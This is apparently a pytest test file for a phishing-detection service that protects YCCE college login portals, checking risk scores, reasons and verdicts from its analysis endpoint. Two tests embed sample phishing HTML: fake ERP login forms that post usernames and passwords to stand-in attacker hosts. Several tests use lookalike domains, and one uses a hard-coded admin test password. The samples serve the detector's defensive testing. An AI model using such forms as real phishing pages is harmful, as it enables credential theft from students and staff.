import pytest
import pytest_asyncio
from httpx import AsyncClient, ASGITransport
from backend.app.main import app, seed_initial_data
from backend.app.database.session import engine, Base

@pytest_asyncio.fixture(autouse=True, scope="function")
async def setup_db():
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    await seed_initial_data()
    yield

@pytest.mark.asyncio
async def test_health():
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as ac:
        res = await ac.get("/api/health")
        assert res.status_code == 200
        assert res.json()["status"] == "ok"

@pytest.mark.asyncio
async def test_auth_login():
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as ac:
        res = await ac.post("/api/auth/login", json={"email": "admin@ycce.edu.in", "password": "password123"})
        assert res.status_code == 200
        data = res.json()
        assert "token" in data
        assert data["user"]["email"] == "admin@ycce.edu.in"

@pytest.mark.asyncio
async def test_dashboard():
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as ac:
        res = await ac.get("/api/dashboard")
        assert res.status_code == 200
        data = res.json()
        assert "total_threats" in data
        assert "critical" in data

@pytest.mark.asyncio
async def test_threats_list():
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as ac:
        res = await ac.get("/api/threats")
        assert res.status_code == 200
        data = res.json()
        assert isinstance(data, list)
        assert len(data) >= 3

@pytest.mark.asyncio
async def test_digital_twins_list():
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as ac:
        res = await ac.get("/api/digital-twins")
        assert res.status_code == 200
        data = res.json()
        assert isinstance(data, list)
        assert len(data) >= 1

@pytest.mark.asyncio
async def test_analyze_endpoint():
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as ac:
        res = await ac.post("/api/analyze", json={"url": "https://ycce-erp-login.xyz"})
        assert res.status_code == 200
        data = res.json()
        assert "risk_score" in data
        assert "status" in data
        assert "recommendation" in data

@pytest.mark.asyncio
async def test_analyze_endpoint_with_html():
    sample_html = """
    <html>
      <head><title>YCCE ERP Login</title></head>
      <body>
        <div class="login-form">
          <h2>Login to ERP</h2>
          <form action="http://malicious-attacker.com/steal" method="POST">
            <input type="text" name="username" />
            <input type="password" name="password" />
            <button type="submit">Sign In</button>
          </form>
        </div>
      </body>
    </html>
    """
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as ac:
        res = await ac.post(
            "/api/analyze",
            json={
                "url": "https://ycce-erp-fake.com/login",
                "html": sample_html,
            },
        )
        assert res.status_code == 200
        data = res.json()
        assert "risk_score" in data
        assert data["risk_score"] > 0
        assert "reasons" in data

@pytest.mark.asyncio
async def test_create_digital_twin(monkeypatch):
    # Test creating a digital twin via API
    # Mock generate_twin_fingerprint to return a realistic mock fingerprint
    async def mock_fingerprint(url: str, name: str):
        return {
            "website_name": name,
            "official_url": url,
            "domain": "portal.ycce.edu.in",
            "fingerprint_version": 1,
            "screenshot_path": "/storage/twins/portal_ycce_edu_in.png",
        }
    
    import backend.app.api.digital_twins as dt_module
    monkeypatch.setattr(dt_module, "generate_twin_fingerprint", mock_fingerprint)

    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as ac:
        res = await ac.post(
            "/api/digital-twins",
            json={
                "website_name": "YCCE Custom Portal",
                "official_url": "https://portal.ycce.edu.in",
            },
        )
        assert res.status_code == 200
        data = res.json()
        assert data["website_name"] == "YCCE Custom Portal"
        assert data["official_url"] == "https://portal.ycce.edu.in"
        assert data["fingerprint_version"] == 1

@pytest.mark.asyncio
async def test_phishing_scoring_bug_report():
    # Verify critical fix for phishing detection
    phish_payload = {
        "url": "https://ycce-erp-login.xyz",
        "html": "<html><head><title>YCCE ERP Login</title></head><body><img src='logo.png'><form action='http://attacker-server.ru/collect'><input type='text' name='username' placeholder='Student ID'><input type='password' name='password' placeholder='Password'><button>Login</button></form></body></html>",
    }
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as ac:
        res = await ac.post("/api/analyze", json=phish_payload)
        assert res.status_code == 200
        data = res.json()
        assert data["status"] == "CRITICAL"
        assert data["risk_score"] >= 90
        assert data["recommendation"] == "BLOCK"
        assert any("Credential Submission Redirected to Unknown Server" in r for r in data["reasons"])

@pytest.mark.asyncio
async def test_official_safe_page_scoring():
    # Verify official domain page is recognized as safe and allowed
    safe_payload = {
        "url": "https://erp.ycce.edu.in",
        "html": "<html><head><title>YCCE ERP</title></head><body><h1>Welcome to YCCE ERP Portal</h1></body></html>",
    }
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as ac:
        res = await ac.post("/api/analyze", json=safe_payload)
        assert res.status_code == 200
        data = res.json()
        assert data["status"] == "TRUSTED"
        assert data["risk_score"] <= 15
        assert data["recommendation"] == "ALLOW"
        assert any("Verified official domain" in r for r in data["reasons"])


@pytest.mark.asyncio
async def test_url_only_analysis_convergence():
    # Verify URL-only (Playwright fallback or pipeline) converges on unified scoring
    url_payload = {
        "url": "https://ycce-erp-login.xyz",
        "metadata": {"browser": "Chrome"},
    }
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as ac:
        res = await ac.post("/api/analyze", json=url_payload)
        assert res.status_code == 200
        data = res.json()
        assert "risk_score" in data
        assert "status" in data
        assert "reasons" in data
        assert "recommendation" in data
        assert data["risk_score"] >= 70

        # If risk is elevated (suspicious domain mismatch), reasons MUST NOT say "No active phishing indicators"
        assert not any("No active phishing indicators" in r for r in data["reasons"])


@pytest.mark.asyncio
async def test_reason_consistency_on_elevated_risk():
    from backend.app.services.ai_service import _get_explain
    explain_mod = _get_explain()
    generate_reasons = explain_mod.generate_reasons

    # 1. Suspicious score with no explicit red flags
    fused = {"visual": 65, "dom": 60, "form": 50, "url": 40}
    contribs = {
        "visual": {"contribution": 20.0},
        "dom": {"contribution": 18.0},
        "form": {"contribution": 15.0},
        "url": {"contribution": 7.0},
    }
    reasons = generate_reasons(fused, contribs, red_flags=[], risk_score=60.0)
    assert len(reasons) > 0
    assert not any("No active phishing indicators" in r for r in reasons)
    assert any("visual" in r.lower() or "structural" in r.lower() or "dom" in r.lower() for r in reasons)

    # 2. Truly safe score on official domain
    safe_fused = {"_metadata": {"candidate_domain": "erp.ycce.edu.in", "twin_domain": "erp.ycce.edu.in"}}
    safe_contribs = {}
    safe_reasons = generate_reasons(safe_fused, safe_contribs, red_flags=[], risk_score=5.0)
    assert any("Verified official domain" in r for r in safe_reasons)




